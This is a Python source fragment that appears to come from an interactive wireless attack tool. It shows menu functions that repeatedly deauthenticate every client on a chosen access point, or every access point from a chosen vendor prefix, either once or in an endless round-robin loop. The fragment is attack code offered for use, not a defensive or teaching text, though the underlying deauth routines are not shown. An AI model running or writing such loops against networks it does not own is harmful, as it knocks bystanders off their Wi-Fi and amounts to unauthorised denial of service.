


def deauth_devices_in_target_ap():
    global target_device
    clear()
    if not target_ap:
        print(
            f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        return
    Save_target_device = target_device

    if device_list_of_target_ap:
        clear()
        print(
            f'{green(str(len(device_list_of_target_ap)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}\n')
        for device in device_list_of_target_ap:
            print(yellow(device))

        print(f"{blue('---------------------------------------')}\n",
              "1   : Deauth all devices once and quit\n",
              "2   : Deauth all devices roundrobin\n",
              "999 : Quit\n")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for device in device_list_of_target_ap:
                    clear()
                    print(f"Deauthing {device} for 60 seconds")
                    target_device = device
                    deauth_target_device(interval=60)
                target_device = Save_target_device
                return
            elif selection == '2':
                rr_counter = 0
                while 1:
                    for device in device_list_of_target_ap:
                        clear()
                        print(f"Deauthing {device} for 60 seconds")
                        target_device = device
                        deauth_target_device(interval=60)
                    rr_counter += 1
                    print(
                        f"each SSID in {green(target_ap)} has been Deauthenticated for {green(rr_counter)} times")
                    print(
                        f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")

                    if check_for_q_press():
                        print("Loop canceled by user.")
                        target_device = Save_target_device
                        return
    else:
        input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')






# TODO
def deauth_by_oui():
    clear()
    if not target_router_oui:
        print(f"Select a {yellow('target OUI')} to continue with this attack")
        if input(f"Select a {yellow('target OUI')} target Y/N : ").lower() == 'y':
            select_target_oui()
        return
    global target_bssid
    store_target_bssid = target_bssid
    if ap_list_of_target_oui:
        print(f"{blue('---------------------------------------')}")
        print(f"List of AP's in {yellow(target_router_oui)}")
        for bssid in ap_list_of_target_oui:
            print(f"{green(bssid)}")
        print(f"{blue('---------------------------------------')}")
        print(f"1   : Deauth all AP's once and quit")
        print(f"2   : Deauth all AP's roundrobin")
        print(f"{blue('---------------------------------------')}")
        print("999 : Quit\n")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for bssid in ap_list_of_target_oui:
                    clear()
                    target_bssid = bssid
                    print(f"Deauthing {bssid} for 60 seconds")
                    deauth(interval=60)
                target_bssid = store_target_bssid
                print(f"Deauthed all AP's in {green(target_router_oui)} for 60 seconds")
                input(f"Press enter to return : ")
                return
            elif selection == '2':
                rr_counter = 0
                while 1:
                    for bssid in ap_list_of_target_oui:
                        clear()
                        target_bssid = bssid
                        print(f"Deauthing {bssid} for 60 seconds")
                        deauth(interval=60)
                    rr_counter += 1
                    print(
                        f"each SSID in {green(target_router_oui)} has been Deauthenticated for {green(rr_counter)} times")
                    print(
                        f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                    if check_for_q_press():
                        clear()
                        target_bssid = store_target_bssid
                        input("Loop canceled by user input, Press enter to return : ")
                        return
    else:
        input(f"No AP found in f{green('target_router_oui')} Press enter to return : ")
    return


# TODO






